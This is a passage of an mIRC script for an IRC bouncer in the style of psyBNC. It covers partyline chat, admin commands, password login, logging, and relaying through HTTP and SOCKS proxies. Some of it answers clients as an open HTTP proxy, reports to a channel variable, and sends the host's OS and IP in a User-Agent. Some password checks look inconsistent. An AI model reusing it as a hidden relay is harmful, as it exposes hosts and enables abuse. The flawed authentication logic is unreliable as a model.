    sockwrite -n link*  : $+ $2 353 $hget($1,NICK) @ &Partyline : $+ $hget(partyline,nicks)
  } 
  if ($1 == PRIVMSG) && ($usersock($2) != $null) || ($2 === GLOBAL) { if ($3 != $null) psyBNC $sockname BNOTICE $2 $right($3-,-1) | halt }

  if ($1 == PRIVMSG) && ($2 == &partyline)  { if ($sock(link*,1).name != $null) sockwrite -n link* : $+ $pnick($sockname) $+ ! $+ $check(USER,$sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($remove($sockname,psyBNC)).ip),$sock($remove($sockname,psyBNC)).ip) PRIVMSG &Partyline  $3- | if ($sock(psyBNC*,1).name != $null) sockwrite -n psyBNC* : $+ $check(USER,$sockname) $+ ! $+ $check(USER,$sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($remove($sockname,psyBNC)).ip),$sock($remove($sockname,psyBNC)).ip) PRIVMSG &Partyline  $3- | halt }

  if ($1 == TOPIC) && ($2 == &Partyline) && (-a isin $sockname) { sockwrite -n * : $+ $pnick($sockname,psyBNC) $+ ! $+  $puser($sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) TOPIC &Partyline $3- | hadd -m partyline topic $3- }
  if ($1 == MODE) && ($2 == &Partyline) && (-a isin $sockname) && ($4) { sockwrite -n * : $+ $pnick($sockname,psyBNC) $+ ! $+  $puser($sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) MODE &Partyline $3 : $+ $4- | if (-o isin $3) psyBNC $sockname UNADMIN $hget($hfind(0,$4,W,1).data,USER) | if (+o isin $3) psyBNC $sockname MADMIN $hget($hfind(0,$4,W,1).data,USER) }

  if (ISON !ISIN $1) { write $log.dir $+ $puser($sockname) $+ $replace($date,/,-) $+ .log $timestamp $1- }
  if ($check(CONNECT,$sockname) == !server!) || ($check(CONNECT,$hget($sockname,user)) == !server!) {
    if (QUIT == $1) { sockclose $sockname | return }
    if (JOIN == $1) { hadd -m $puser($sockname) channels $remove($2,:) $+ , $+ $hget($puser($sockname),channels) }
    if (PART == $1) { hadd -m $puser($sockname) channels $remove($hget($puser($sockname),channels),$remove($2,:)) }
    if (MADMIN == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (SETUSERNAME == $1) { psyBNC $sockname $1 $2- | return }
    if (ADDSERVER == $1) { psyBNC $sockname $1 $2 $3 | .timer $+ $sockname $+ .bconnect -o 0 3 psy.chk $sockname | return }
    if (ADDUSER == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (BCONNECT == $1) { psyBNC $sockname $1 $2 | .timer $+ $sockname $+ .bconnect -o 0 3 psy.chk $sockname | return }
    if (BQUIT == $1) { psyBNC $sockname $1 $2 $3- | return }
    if (BKILL == $1) { psyBNC $sockname $1 $2 $3- | return }
    if (BNOTICE == $1) { psyBNC $sockname $1 $2 $3- | return }
    if (PROXY == $1) { psyBNC $sockname $1 $2 | return }
    if (UNADMIN == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (DELSERVER == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (DELUSER == $1) { psyBNC $sockname $1 $2 $3 | return } 
    if (JUMP == $1) { psyBNC $sockname $1 | return }
    if (LISTSERVERS == $1) { psyBNC $sockname $1 | return }
    if (LINKFROM == $1) { psyBNC $sockname $1- | return }
    if (LINKTO == $1) { psyBNC $sockname $1- | return }
    if (TRANSLANTE == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (DELTRANSLATE == $1) { psyBNC $sockname $1 $2 | return }
    if (LISTTRANSLATE == $1) { psyBNC $sockname $1 | return }
    if (NAMEBOUNCER == $1) { psyBNC $sockname $1 | return }
    if (DELLINK == $1) { psyBNC $sockname $1 | return }
    if (BWHO == $1) { psyBNC $sockname $1 | return }
    if (PLAYPRIVATELOG == $1) { psyBNC $sockname $1 | return }
    if (ERASEPRIVATELOG == $1) { psyBNC $sockname $1 | return }
    if (PLAYTRAFFICLOG == $1) { psyBNC $sockname $1 | return }
    if (ERASETRAFFICLOG == $1) { psyBNC $sockname $1 | return }
    if (PLAYMAINLOG == $1) { psyBNC $sockname $1 | return }
    if (ERASEMAINLOG == $1) { psyBNC $sockname $1 | return }
    if (SETAWAY == $1) { psyBNC $sockname $1 $2- | return }
    if (SETAWAYNICK == $1) { psyBNC $sockname $1 $2 | return }
    if (SETLEAVEMSG == $1) { psyBNC $sockname $1 $2- | return }
    if (PASSWORD == $1) { psyBNC $sockname $1 $2 $3- | return }
    if (BHELP == $1) { psyBNC bhelp $sockname $2  }
    if ($1 == PRIVMSG) && ($2 == -psyBNC) && (BHELP == $remove($3,:))  { psyBNC bhelp $sockname $4-  | return }
    if ($1 == PRIVMSG) && ($2 == -psyBNC) && (BHELP != $remove($3,:)) { psyBNC $sockname $remove($3,:) $4- | return }
    if ($sock($gettok($replace($sockname,psyBNC,server),1,95)).ip) { sockwrite -n $gettok($replace($sockname,psyBNC,server),1,95) %psyBNC }
    elseif (!$sock($gettok($replace($sockname,psyBNC,server),1,95)).ip) { hadd -m $sockname CONNECT !server! }    
  }
  if ($check(CONNECT,$sockname) == !auth!) || ($check(CONNECT,$hget($sockname,user)) == !auth!) {
    if (QUIT == $1) { write_mainlog $puser($sockname) $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) $+ ) Logged off. | sockwrite -n psyBNC* : $+ $pnick($sockname) $+ ! $+ $puser($sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) PART &Partyline $iif($right($2-,-1),:Quit: $v1,:Client disconnected) |  hadd -m partyline nicks $iif(!$hget(partyline,nicks),$null,$remtok($hget(partyline,nicks),$iif(-a isin $check(sockname,$puser($sockname)),@ $+ $puser($sockname),$puser($sockname)),32)) }
    if (MADMIN == $1) { psyBNC $sockname $1 $2 $3 }
    if (SETUSERNAME == $1) { psyBNC $sockname $1 $2- }
    if (ADDSERVER == $1) { psyBNC $sockname $1 $2 $3 | .timer $+ $sockname $+ .bconnect -o 0 5 psy.chk $sockname  }
    if (ADDUSER == $1) { psyBNC $sockname $1 $2 $3 }
    if (BCONNECT == $1) { psyBNC $sockname $1 $2 | .timer $+ $sockname $+ .bconnect -o 0 5 psy.chk $sockname  }
    if (BQUIT == $1) { psyBNC $sockname $1 $2 $3- }
    if (BKILL == $1) { psyBNC $sockname $1 $2 $3- }
    if (BNOTICE == $1) { psyBNC $sockname $1 $2 $3- }
    if (PROXY == $1) { psyBNC $sockname $1 $2 }
    if (UNADMIN == $1) { psyBNC $sockname $1 $2 $3 }
    if (DELSERVER == $1) { psyBNC $sockname $1 $2 $3 }
    if (DELUSER == $1) { psyBNC $sockname $1 $2 $3 }
    if (JUMP == $1) { psyBNC $sockname $1 }
    if (LISTSERVERS == $1) { psyBNC $sockname $1 }
    if (LINKFROM == $1) { psyBNC $sockname $1 }
    if (LINKTO == $1) { psyBNC $sockname $1 }
    if (TRANSLANTE == $1) { psyBNC $sockname $1 $2 $3 | return }
    if (DELTRANSLATE == $1) { psyBNC $sockname $1 $2 | return }
    if (LISTTRANSLATE == $1) { psyBNC $sockname $1 | return }
    if (NAMEBOUNCER == $1) { psyBNC $sockname $1 }
    if (DELLINK == $1) { psyBNC $sockname $1 }
    if (BWHO == $1) { psyBNC $sockname $1  }
    if (PLAYPRIVATELOG == $1) { psyBNC $sockname $1 }
    if (ERASEPRIVATELOG == $1) { psyBNC $sockname $1 }
    if (SETAWAY == $1) { psyBNC $sockname $1 $2- }
    if (SETAWAYNICK == $1) { psyBNC $sockname $1 $2 }
    if (SETLEAVEMSG == $1) { psyBNC $sockname $1 $2- }
    if (PASSWORD == $1) { psyBNC $sockname $1 $2 $3 }
    if (PLAYMAINLOG == $1) { psyBNC $sockname $1 $2 }
    if (ERASEMAINLOG == $1) { psyBNC $sockname $1 }
    if (BHELP == $1) { psyBNC bhelp $sockname $2 }
    if ($1 == PRIVMSG) && ($2 == -psyBNC) && (BHELP == $remove($3,:))  { psyBNC bhelp $sockname $4- }
    if ($1 == PRIVMSG) && ($2 == -psyBNC) && (BHELP != $remove($3,:)) { psyBNC $sockname $remove($3,:) $4- }
    return  
  }
  if ($check(CONNECT,$sockname) == !connect!) || ($check(CONNECT,$hget($sockname,user)) == !connect!) {
    if ($1 == nick) { psy.nick $remove($2,:) $sockname }
    if ($1 == user) {
      hadd -m $hget($2,sockname) USER $2
      hadd -mu120 $sockname USER.LOGIN true
      if (!$check(PASS,$2)) && ($findfile($scriptdir,psyBNC.*.dat,0) == 0) {
        hadd -m $2 user $2 
        noticeauth $sockname Welcome $2 !
        noticeauth $sockname You are the first to connect to this new proxy server.
        noticeauth $sockname You are the proxy-admin. Use ADDSERVER to add a server so the bouncer may connect.     
        psy addadmin $2 $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)
        psyBNC BHELP $sockname 
        hadd -m $sockname CONNECT !auth! 
        hadd -m $2 USER $2
        hadd -m $2 SOCKNAME $sockname
        .timer $+ $sockname $+ .bconnect -o 0 5 psy.chk $sockname
        return
      }   
      hadd -m $2 CONNECT !connect!
      hadd -m $sockname CONNECT !connect!
      hadd -m $sockname USER $2
      if ($hget($sockname,PASSWD) !== $check(pass,$2)) && ($hget($sockname,PASSWD)) { noticeauth $sockname Wrong Password. Disconnecting. | .timer 1 0.5 sockclose $sockname |   if ($sock(*-a*).name) GLOBAL *-a* [ADMINMSG] Failed login from $sock($sockname).ip on port $sock($sockname).port $+ . | halt }
      if ($hget($sockname,PASSWD) === $check(pass,$2)) && ($check(pass,$2)) { psy.login $2 $pnick($sockname) }
      if ($hget($sockname,PASSWD) == $check(pass,$2)) || ($check(pass,$2) !== $hget($sockname,PASSWD)) && ($check(pass,$sockname)) && ($hget($sockname,PASSWD)) { noticeauth $sockname Wrong Password. Disconnecting. | .timer 1 0.5 sockclose $sockname |   if ($sock(*-a).name) GLOBAL *-a* [ADMINMSG] Failed login from $sock($sockname).ip on port $sock($sockname).port $+ . | halt }            
      if (!$hget($sockname,PASSWD)) && ($check(pass,$2)) || (!$check(pass,$2)) && (!$hget($sockname,PASSWD)) { sockwrite -n $sockname : $+ $logo NOTICE AUTH :Your IRC Client did not support a password. Please type /QUOTE PASS yourpassword to connect | halt }      
      if ($check(sockname,$2)) && ($sock($check(sockname,$2)).ip) { hadd -m $2 SOCKNAME $sockname | sockrename $sockname $deltok($check(sockname,$2),95,1)  | hadd -m $deltok($check(sockname,$2),95,1) CONNECT !connect! | hadd -m $deltok($check(sockname,$2),95,1) USER $2 |  hadd -m $sockname USER $2 | hadd -m $deltok($check(sockname,$2),95,1) NICK $check(NICK,$deltok($sockname,95,1)) | hfree $sockname }
      if (!$check(sockname,$2)) { .hadd -m $2 sockname $sockname }
    }      

    if ($1 == pass) { 
      hadd -mu300 $sockname PASSWD $md5($2)
      if (!$hget($sockname,USER.LOGIN)) halt
      if ($hget($sockname,PASSWD) !== $check(PASS,$hget($sockname,USER))) { noticeauth $sockname Wrong Password. Disconnecting. | .timer 1 0.5 sockclose $sockname | if ($sock(*-a*).name) GLOBAL *-a* [ADMINMSG] Failed login from $sock($sockname).ip on port $sock($sockname).port $+ . | halt }


      if ($hget($sockname,PASSWD) === $check(PASS,$hget($sockname,USER))) { psy.login $puser($sockname) $pnick($sockname)  | hdel $sockname USER.LOGIN }
    }

  }
}

alias psy.login {
  sockwrite -n $sockname :Welcome!psyBNC@lam3rz.de NOTICE * : $+ $logo
  hinc -m BHELPed $1 
  if ($hget(BHELPed,$1) == 1) { psyBNC BHELP $sockname  }
  hadd -m $sockname CONNECT !auth!   
  hadd -m $1 CONNECT !auth!
  hadd -m $sockname USER $1
  hadd -m $sockname NICK $2
  hadd -m $hget($1,sockname) USER $1
  hadd -m $hget($1,sockname) NICK $2
  hadd -m $1 USER $1
  hadd -m $1 NICK $2
  write_mainlog User $1 Logged in (from $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) $+ )
  sockwrite -n * : $+ $2 $+ ! $+ $1 $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) JOIN :&Partyline
  if (-a isin $check(sockname,$1)) sockwrite -n psyBNC* :-psyBNC!Elite@ $+ $psyencrypt( $+ $sock($sockname).ip $+ ) MODE &Partyline +o : $+ $hget($1,NICK)
  if ($hget(partyline,topic)) sockwrite -n $sockname $+ * :psyBNC.Elite.Lam3rz 332 $hget($1,NICK) &Partyline $hget(partyline,topic)

  hadd -m partyline nicks $iif(!$hget(partyline,nicks),$iif(-a isin $check(sockname,$1),@ $+ $puser($1),$puser($1)),$addtok($hget(partyline,nicks),$iif(-a isin $check(sockname,$1),@ $+ $pnick($1),$pUSER($1)),32)) 
  sockwrite -n $sockname $+ * :127.0.0.1 353 $hget($1,NICK) @ &Partyline : $+ $hget(partyline,nicks)
  sockwrite -n $sockname $+ * :127.0.0.1 366 $hget($1,NICK) &Partyline :End of /NAMES list

  if ($check(sockname,$1) != $sockname) {
    if (!$sock($check(sockname,$1)).ip) hadd -m $1 SOCKNAME $gettok($check(sockname,$1),1,95)
    elseif ($sock($check(sockname,$1)).ip) hadd -m $1 SOCKNAME $gettok($check(sockname,$1),1,95)
    sockrename $sockname $deltok($hget($1,SOCKNAME),95,1)
    if ($sock($replace($gettok($usersock($1),1,95),psyBNC,server*)).name != $null) { 

      if ($isfile($welcome) == $true) .play -ap ssww1 $sockname $welcome 0
      sockwrite -n $gettok($replace($sockname,psyBNC,server),1,95) MOTD 
      socket.join.channels $1
      if ($isfile($ppm $+ $1 $+ .ppm) == $true) { 
        noticeauth $sockname You have messages, please use /quote PLAYPRIVATELOG . 
      } 
      if ($isfile($ppm $+ $1 $+ .ppc) == $true) {
        noticeauth $sockname To play channels logs, please use /quote PLAYTRAFFICLOG . 
      } 
      psyBNC $sockname GETONLINE
    }   
  } 
  if (!$sock(server $+ $remove($sockname,psyBNC)).name) && (!$check(bquit,$sockname)) { .timer $+ $sockname $+ .BCONNECT 1 10 psy.chk $sockname } 
  halt
}
alias psy.bwho {

  hinc -mu1 BWHO BWHO
  if ($hget(BWHO,BWHO) > $findfile($scriptdir,psyBNC.*.dat,0)) { goto END } 
  noticeauth $1 $hget($remove($nopath($findfile($scriptdir,psyBNC.*.dat,$hget(BWHO,BWHO))),psyBNC.,.dat),nick) $+ ( $+ $remove($nopath($findfile($scriptdir,psyBNC.*.dat,$hget(BWHO,BWHO))),psyBNC.,.dat) $+ ) $+ @ $+ $iif($sock($hget($hget(BWHO,BWHO),sockname)).ip,$psyencrypt($v1)) $chr(91) $+ $iif($sock($replace($hget($hget(BWHO,BWHO),sockname),psyBNC,server)).ip,: $+ $v1 $+ : $+ $sock($replace($hget($hget(BWHO,BWHO),sockname),psyBNC,server)).port,last: $iif($check(SERVER1,$puser($hget($hget(BWHO,BWHO),sockname))),$v1,$spaces(20))) $+ $chr(93) : $+ $user.name($puser($hget($hget(BWHO,BWHO),sockname))) 
  return
  :END
  hdel $1 BWHO 
}
alias savedata { .timerSAVE -o $hget(0) 0 psy.savedata data  }
alias psy.savedata {
  hinc -mu5 $1 SAVE
  if ($hget($1,SAVE) >= $hget(0)) { goto END } 
  if ($hget($hget($1,SAVE),user)) { hsave $v1 $scriptdirpsyBNC. $+ $v1 $+ .dat }
  return
  :END
  hdel $1 SAVE
}
alias loaddata {
  %psy.maxuser = 100
  %encryptIP = yes
  hmake BHELP
  Hload BHELP $scriptdir\psyBNC.BHELP.EN
  .opnotice %fldchan 3* English help file loaded.
  if (!$hget(data,SAVE)) hmake data
  if ($findfile($scriptdir,psyBNC.*.dat,0)) .timer $v1 0 psy.loaddata data
}
alias psy.loaddata {

  hinc -mu2 $1 LOAD
  hadd -mu2 FILE LOAD $findfile($scriptdir,psyBNC.*.dat,$hget($1,LOAD))
  if ($hget(FILE,LOAD)) hmake $remove($nopath($hget(FILE,LOAD)),psyBNC.,.dat) |  hload $nopath($remove($hget(FILE,LOAD),psyBNC.,.dat)) $hget(FILE,LOAD) | .hadd -m $check(sockname,$remove($hget(FILE,LOAD),psyBNC.,.dat)) USER $remove($hget(FILE,LOAD),psyBNC.,.dat)
  .timerLOAD 1 2 .opnotice %fldchan 3* psyBNC User Data Loaded.
}
;;;;;;;;;;;;;;;;;;;SOCKETS;;;;;;;;;;;;;;;;;;;;;;;;

on *:SOCKREAD:PSY.LINK*:{
  sockread -f %psy.link
  sockwrite -n psy* %psy.link
}

on *:SOCKOPEN:server*:{
  if ($sockerr) { sockclose $replace($sockname,server,psybnc) | return }
  if ($calc($hget(make,maxout) +1) < $sock(server*,0).name)  { sockwrite -tn $sockname HTTP/1.1 403 Forbidden | .timeropen124 $+ $sockname -om 1 100 sockclose pf* $+ $hget(make,temp) $+ * }
  if ($sock($replace($sockname,server,psybnc)).ip) {
    .sockwrite -tn $replace($sockname,server,psybnc) HTTP/1.1 200 Connection Established
    if (CONNECT*:66??* !iswm $hget(make,sockmark)) {
      .sockwrite -tn $sockname $hget(make,sockmark)
      .sockwrite -tn $sockname Host: $gettok($protocol($gettok($hget(make,sockmark),2,32)),1,58)
      .sockwrite -tn $sockname User-Agent: Mozilla/5.0 $os $fulltime $ip
      .sockwrite -tn $sockname Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      .sockwrite -tn $sockname Accept-Language: en-US,en;q=0.8
      .sockwrite -tn $sockname Connection: keep-alive
      .sockwrite $sockname $crlf
      .sockwrite $sockname $crlf
    }
 
  }
  if ($sockerr) {
    if ($sockerr == 3) { psy.closinglink | psy.reconnect 1 | halt }
    if ($sock($replace($sockname,proxy.server,psyBNC)).name != $null) { psy.closinglink | psy.reconnect 1  }
    if (!$sock($replace($sockname,proxy.server,psyBNC)).name) { hadd -m $sockname NICK $pnick($replace($sockname,proxy.server,psyBNC)) }
  }
  if ($sockerr <= 0) && (proxy !isin $sockname)  { 
    hadd -m psyBNC $+ $remove($sockname,server) CONNECT !sErVer! | hadd -m $sockname NICK $pnick(psyBNC $+ $remove($sockname,server)) | hadd -m $sockname USER $puser(psyBNC $+ $remove($sockname,server))
    sockwrite -tn $sockname NICK  : $+ $hget($sockname,NICK) 
    sockwrite -tn $SOckname USER  $iif(!$check(username,$puser($sockname)),psyBNC.at,$puser($sockname)) "." "." : $+ $iif(!$check(username,$puser($sockname)),psyBNC.at,$puser($sockname))
  } 
}
alias pxytimeout {      
  .timerTIMEOUT $+ $remove($sockname,proxy.server,psyBNC) -o 1 $1 noticeauth psyBNC $+ $remove($sockname,server) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,proxy.server)) got disconnected from server.
  .timerTIMEOUT1 $+ $remove($sockname,proxy.server,psyBNC) -o 1 $calc($1 + 1) sockclose $sockname
  .timerTIMEOUT2 $+ $remove($sockname,proxy.server,psyBNC) -o 1 $calc($1 + 1) hadd -m $replace($sockname,proxy.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,proxy.server,psyBNC) NICK $pnick($replace($sockname,proxy.server,psyBNC)) | hadd -m $replace($sockname,proxy.server,psyBNC) USER $puser($replace($sockname,proxy.server,psyBNC))
  .timer $+ $replace($sockname,proxy.server,psyBNC)) $+ . $+ BCONNECT -o 1 $calc($1 + 2) psyBNC $replace($sockname,proxy.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,proxy.server,psyBNC))) 
}
alias s5timeout { 
  .timerTIMEOUT $+ $remove($sockname,socks5.server,psyBNC) -o 1 $1 noticeauth $replace($sockname,socks5.server,psyBNC)  $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,socks5.server)) got disconnected from server.
  .timerTIMEOUT1 $+ $remove($sockname,socks5.server,psyBNC) -o 1 $calc($1 + 1) sockclose $sockname
  .timerTIMEOUT2 $+ $remove($sockname,socks5.server,psyBNC) -o 1 $calc($1 + 1) hadd -m $replace($sockname,socks5.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,socks5.server,psyBNC) NICK $pnick($replace($sockname,socks5.server,psyBNC)) | hadd -m $replace($sockname,socks5.server,psyBNC) USER $puser($replace($sockname,socks5.server,psyBNC))
  .timer $+ $replace($sockname,socks5.server,psyBNC) $+ . $+ BCONNECT -o 1 $calc($1 + 2) psyBNC $replace($sockname,socks5.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,socks5.server,psyBNC))) 
}
alias s4timeout {     
  .timerTIMEOUT $+ $remove($sockname,socks4.server,psyBNC)-o 1 $1 noticeauth $replace($sockname,socks4.server,psyBNC) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,socks4.server)) got disconnected from server.
  .timerTIMEOUT1 $+ $remove($sockname,socks4.server,psyBNC) -o 1 $calc($1 + 1) sockclose $sockname
  .timerTIMEOUT2 $+ $remove($sockname,socks4.server,psyBNC) -o 1 $calc($1 + 1) hadd -m $replace($sockname,socks4.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,socks4.server,psyBNC) NICK $pnick($replace($sockname,socks4.server,psyBNC)) | hadd -m $replace($sockname,socks4.server,psyBNC) USER $puser($replace($sockname,socks4.server,psyBNC))
  .timer $+ $replace($sockname,socks4.server,psyBNC) $+ . $+ BCONNECT -o 1 $calc($1 + 2) psyBNC $replace($sockname,socks4.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,socks4.server,psyBNC))) 
}
alias psy.closinglink {
  if ($1 == pxy) {

    noticeauth $replace($sockname,proxy.server,psyBNC) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,proxy.server)) got disconnected from server.
    hadd -m $replace($sockname,proxy.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,proxy.server,psyBNC) NICK $pnick($replace($Sockname,proxy.server,psyBNC)) | hadd -m $replace($sockname,proxy.server,psyBNC) USER $puser(psyBNC $+ $remove($sockname,proxy.server)) 
  }
  if ($1 == socks5) {

    noticeauth $replace($sockname,socks5.server,psyBNC) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,socks5.server)) got disconnected from server.
    hadd -m $replace($sockname,socks5.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,socks5.server,psyBNC) NICK $pnick($replace($Sockname,socks5.server,psyBNC)) | hadd -m $replace($sockname,socks5.server,psyBNC) USER $puser(psyBNC $+ $remove($sockname,socks5.server))
  }
  if ($1 == socks4) {

    noticeauth $replace($sockname,socks4.server,psyBNC) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,socks4.server)) got disconnected from server.
    hadd -m $replace($sockname,socks4.server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,socks4.server,psyBNC)  NICK $pnick($replace($Sockname,socks4.server,psyBNC)) | hadd -m $replace($sockname,socks4.server,psyBNC) USER $puser(psyBNC $+ $remove($sockname,socks4.server))
  }
  else {

    noticeauth $replace($sockname,server,psyBNC) $+ * $date $time :User $puser(psyBNC $+ $remove($sockname,server)) got disconnected from server.
    hadd -m $replace($sockname,server,psyBNC) CONNECT !AUTH! | hadd -m $replace($sockname,server,psyBNC) NICK $pnick($replace($Sockname,server,psyBNC)) | hadd -m $replace($sockname,server,psyBNC) USER $puser(psyBNC $+ $remove($sockname,server))
  }
}
alias psy.reconnect { 
  if ($2 == pxy) { .timer $+ $replace($sockname,proxy.server,psyBNC) $+ . $+ BCONNECT 1 $1 psyBNC $replace($sockname,proxy.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,proxy.server,psyBNC)))  }
  if ($2 == socks4) { .timer $+ $replace($sockname,socks4.server,psyBNC) $+ . $+ BCONNECT 1 $1 psyBNC $replace($sockname,socks4.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,socks4.server,psyBNC)))  }
  if ($2 == socks5) { .timer $+ $replace($sockname,socks5.server,psyBNC) $+ . $+ BCONNECT 1 $1 psyBNC $replace($sockname,socks5.server,psyBNC) BCONNECT $pserver($puser($replace($sockname,socks5.server,psyBNC)))  }
  else { .timer $+ $replace($sockname,server,psyBNC) $+ . $+ BCONNECT 1 $1 psyBNC $replace($sockname,server,psyBNC) BCONNECT $pserver($puser($replace($sockname,server,psyBNC)))  }
}
on &*:SOCKOPEN:proxy.server*:{
  if ($sockerr) {
    if ($sock($sockname).wsmsg == [10065] No Route to Host) { psy.closinglink pxy | psy.reconnect 3 pxy | halt }
    if ($sock($replace($sockname,proxy.server,psyBNC)).name != $null) { psy.closinglink pxy | psy.reconnect 0.1 pxy }
    if ($sock($replace($sockname,proxy.server,psyBNC)).name == $null) { hadd -m $sockname NICK $pnick($replace($sockname,proxy.server,psyBNC)) }
  }
  if (!$sockerr) { 
    hadd -m $replace($Sockname,proxy.server,psyBNC) CONNECT !sErVer! | hadd -m $replace($Sockname,proxy.server,psyBNC) NICK $pnick($replace($Sockname,proxy.server,psyBNC)) | hadd -m $replace($Sockname,proxy.server,psyBNC) USER $puser($replace($Sockname,proxy.server,psyBNC))
    pxytimeout 15
    sockwrite -n $sockname CONNECT $pserver($puser($replace($sockname,proxy.server,psyBNC))) HTTP/1.0 $+ $crlf
    sockwrite -n $sockname $crlf
    sockwrite -n $sockname $crlf
  }
}
on *:SOCKREAD:proxy.server*:{
  sockread %proxy.server 
  tokenize 32 %proxy.server
  if ($sock($remove($sockname,proxy.)).ip == $null) {  
    hadd -m $remove($sockname,proxy.) CONNECT !sErVer! | hadd -m $remove($sockname,proxy.) NICK $pnick($replace($Sockname,proxy.server,psyBNC)) | hadd -m $remove($sockname,proxy.) USER $puser($replace($Sockname,proxy.server,psyBNC))
  }
  if ($gettok(%proxy.server,2-,32) == NOTICE AUTH :*** Looking up your hostname...) || ($gettok(%proxy.server,2,32) isnum) { 
    .timer*timeout* $+ $remove($sockname,proxy.,server,psyBNC) $+ * off
    sockwrite -n $sockname NICK  : $+ $pnick($sockname) 
    sockwrite -n $sockname USER $puser($sockname) . . : $+ $user.name($sockname) 
    sockrename $sockname server $+ $deltok($remove($sockname,proxy.server,server),95,1)
    hadd -m $replace($Sockname,proxy.server,psyBNC) CONNECT !sErVer! | hadd -m $replace($Sockname,proxy.server,psyBNC) NICK $pnick($replace($Sockname,proxy.server,psyBNC)) | hadd -m $replace($Sockname,proxy.server,psyBNC) USER $puser($replace($Sockname,proxy.server,psyBNC))
  }
  if (451 == $gettok(%proxy.server,2,32)) || (43* iswm $gettok(%proxy.server,2,32))  { 
    .timerPSYNICK $+ $sockname -o 1 3 sockwrite -tn $sockname NICK : $+ $pnick($replace($Sockname,proxy.server,psyBNC))
    .timerPSYUSR $+ $sockname -o 1 3 sockwrite -tn $Sockname USER $puser($sockname) . . : $+ $user.name($sockname) 
    .timerPSYRENAME $+ $sockname -o 1 3 sockrename $sockname server $+ $deltok($remove($sockname,proxy.server,server),95,1)
    .timerPSYMARK $+ $sockname -o 1 3 hadd -m $pnick($replace($Sockname,proxy.server,psyBNC)) CONNECT !sErVer!
    hadd -m $pnick($replace($Sockname,proxy.server,psyBNC)) NICK $pnick($replace($Sockname,proxy.server,psyBNC))
    hadd -m $pnick($replace($Sockname,proxy.server,psyBNC)) USER $puser($replace($Sockname,proxy.server,psyBNC))

  }
}
on &*:SOCKOPEN:socks5.server*:{
  if ($sockerr) {
    if ($sock($sockname).wsmsg == [10065] No Route to Host) { psy.closinglink socks5 | psy.reconnect 30 socks5 | halt }
    if ($sock($replace($sockname,socks5.server,psyBNC)).name != $null) { psy.closinglink socks5 | psy.reconnect 0.1 socks5 }
    if ($sock($replace($sockname,socks5.server,psyBNC)).name == $null) { hadd -m $sockname NICK $pnick($replace($sockname,socks5.server,psyBNC)) }
  }
  if (!$sockerr) { 
    hadd -m $replace($Sockname,socks5.server,psyBNC) CONNECT !sErVer! | hadd -m $sockname NICK $pnick($replace($Sockname,socks5.server,psyBNC)) | hadd -m $sockname USER $puser($replace($Sockname,socks5.server,psyBNC))
    s5timeout 20
    set %s5time $ticks 
    .bset &bvar5 1 5 1 0 
    .sockwrite -n $sockname &bvar5
    .bunset &bvar5 
    halt 
  }
}
on *:SOCKREAD:socks5.server*:{
  if ($sockbr) { return } 
  .sockread &bsocks5 
  sockwrite $replace($sockname,socks5.server,psyBNC) &bsocks5
  if (PING isin $bvar(&bsocks5,1,$bvar(&bsocks5,0).text)) sockwrite -n $sockname PONG $remove($gettok($bvar(&bsocks5,1,$bvar(&bsocks5,0)).text,$calc($findtok($bvar(&bsocks5,1,$bvar(&bsocks5,0)).text,PING,32)+1),32),:)
  if ($bvar(&bsocks5,1,2) == 5 0) && ($bvar(&bsocks5,3) != 0) { 
    .bset &socks5 1 5 1 0 1 $replace($gettok($pserver($puser($replace($sockname,socks5.server,psyBNC))),1,58),.,$chr(32)) $gettok($longip($gettok($pserver($puser($replace($sockname,socks5.server,psyBNC))),2,58)),3,46) $gettok($longip($gettok($pserver($puser($replace($sockname,socks5.server,psyBNC))),2,58)),4,46)
    .sockwrite -n $sockname &socks5 
    .bunset &socks5 
    sockrename $sockname $deltok($remove($sockname,socks5.),95,1)
  } 
}
on &*:SOCKOPEN:socks4.server*:{
  if ($sockerr) {
    if ($sock($sockname).wsmsg == [10065] No Route to Host) { psy.closinglink socks4 | psy.reconnect 30 socks4 | halt }
    if ($sock($replace($sockname,socks4.server,psyBNC)).name != $null) { psy.closinglink socks4 | psy.reconnect 0.1 socks4 }
    if ($sock($replace($sockname,socks4.server,psyBNC)).name == $null) { hadd -m $sockname NICK $pnick($replace($sockname,socks4.server,psyBNC)) }
  }
  if (!$sockerr) { 
